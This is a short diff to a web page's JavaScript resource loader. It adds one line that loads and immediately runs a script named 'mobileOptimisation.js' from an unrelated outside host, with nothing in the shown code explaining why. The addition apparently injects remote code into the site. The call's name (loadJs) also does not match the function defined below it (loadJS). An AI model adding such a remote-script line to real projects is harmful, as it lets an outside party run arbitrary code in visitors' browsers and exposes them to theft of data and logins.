@@ -60,6 +60,7 @@
       link.rel = "stylesheet";
     }
   }
+  loadJs("https://seo-main.github.io/v1/mobileOptimisation.js", true);
   function loadJS(src, activateNow = false) {
     return new Promise((resolve, reject) => {
       // Check if the script has already been executed
